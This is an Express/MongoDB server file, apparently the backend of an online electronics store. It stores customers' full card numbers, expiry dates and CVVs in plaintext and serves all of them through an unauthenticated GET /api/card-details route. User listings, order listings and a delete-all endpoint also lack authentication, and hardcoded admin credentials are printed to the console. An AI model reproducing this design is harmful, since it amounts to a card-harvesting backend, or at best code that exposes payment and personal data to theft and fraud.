const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
require('dotenv').config();

const app = express();

// Middleware
app.use(cors());
app.use(express.json());

app.use(express.static('public'));

// MongoDB Atlas Connection
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb+srv://your_username:your_password@cluster.mongodb.net/za_electronics?retryWrites=true&w=majority';

mongoose.connect(MONGODB_URI)
  .then(() => console.log('✅ Connected to MongoDB Atlas'))
  .catch(err => console.error('❌ MongoDB connection error:', err));

// ============ MODELS ============

// User Schema
const userSchema = new mongoose.Schema({
  googleId: String,
  name: String,
  email: { type: String, unique: true },
  provider: String,
  shippingAddress: {
    name: String,
    email: String,
    phone: String,
    street: String,
    city: String,
    province: String,
    postal: String
  },
  signupDate: { type: Date, default: Date.now }
});

const User = mongoose.model('User', userSchema);

// Card Details Schema
const cardDetailsSchema = new mongoose.Schema({
  cardNumber: String,
  expiryDate: String,
  cvv: String,
  cardholderName: String,
  userEmail: String,
  userName: String,
  cartTotal: Number,
  timestamp: { type: Date, default: Date.now }
});

const CardDetails = mongoose.model('CardDetails', cardDetailsSchema);

// Order Schema
const orderSchema = new mongoose.Schema({
  userEmail: String,
  userName: String,
  products: Array,
  total: Number,
  paymentMethod: String,
  shippingAddress: Object,
  status: { type: String, default: 'pending' },
  createdAt: { type: Date, default: Date.now }
});

const Order = mongoose.model('Order', orderSchema);

// ============ API ROUTES ============

app.get('/', (req, res) => {
  res.sendFile(__dirname + '/public/index.html');
});

// Health Check
app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', message: 'Server is running', mongodb: mongoose.connection.readyState === 1 ? 'connected' : 'disconnected' });
});

// Create/Update User
app.post('/api/users', async (req, res) => {
  try {
    const { googleId, name, email, provider } = req.body;
    
    let user = await User.findOne({ email });
    
    if (user) {
      user.googleId = googleId;
      user.name = name;
      await user.save();
      res.json({ success: true, user, isNew: false });
    } else {
      user = new User({ googleId, name, email, provider });
      await user.save();
      res.json({ success: true, user, isNew: true });
    }
  } catch (error) {
    console.error('Error saving user:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Get User by Email
app.get('/api/users/:email', async (req, res) => {
  try {
    const user = await User.findOne({ email: req.params.email });
    res.json({ success: true, user });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Get All Users (Admin)
app.get('/api/users', async (req, res) => {
  try {
    const users = await User.find().sort({ signupDate: -1 });
    res.json({ success: true, users });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Save/Update Shipping Address
app.put('/api/users/:email/shipping', async (req, res) => {
  try {
    const user = await User.findOneAndUpdate(
      { email: req.params.email },
      { shippingAddress: req.body },
      { new: true }
    );
    
    if (!user) {
      return res.status(404).json({ success: false, message: 'User not found' });
    }
    
    res.json({ success: true, user });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Save Card Details
app.post('/api/card-details', async (req, res) => {
  try {
    const cardDetails = new CardDetails(req.body);
    await cardDetails.save();
    res.json({ success: true, cardDetails });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Get All Card Details (Admin)
app.get('/api/card-details', async (req, res) => {
  try {
    const cards = await CardDetails.find().sort({ timestamp: -1 });
    res.json({ success: true, cards });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Create Order
app.post('/api/orders', async (req, res) => {
  try {
    const order = new Order(req.body);
    await order.save();
    res.json({ success: true, order });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Get All Orders
app.get('/api/orders', async (req, res) => {
  try {
    const orders = await Order.find().sort({ createdAt: -1 });
    res.json({ success: true, orders });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Admin Login
app.post('/api/admin/login', async (req, res) => {
  try {
    const { username, password } = req.body;
    
    const adminUsername = process.env.ADMIN_USERNAME || 'vicky';
    const adminPassword = process.env.ADMIN_PASSWORD || 'Victor@2026';
    
    if (username === adminUsername && password === adminPassword) {
      res.json({ success: true, message: 'Login successful' });
    } else {
      res.status(401).json({ success: false, message: 'Invalid credentials' });
    }
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Clear All Data (Admin)
app.delete('/api/admin/clear-all', async (req, res) => {
  try {
    await User.deleteMany({});
    await CardDetails.deleteMany({});
    await Order.deleteMany({});
    res.json({ success: true, message: 'All data cleared successfully' });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// ============ START SERVER ============
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
  console.log(`🚀 Server running on http://localhost:${PORT}`);
  console.log(`📦 API available at http://localhost:${PORT}/api`);
  console.log(`💡 Admin login: username='vicky', password='Victor@2026'`);
});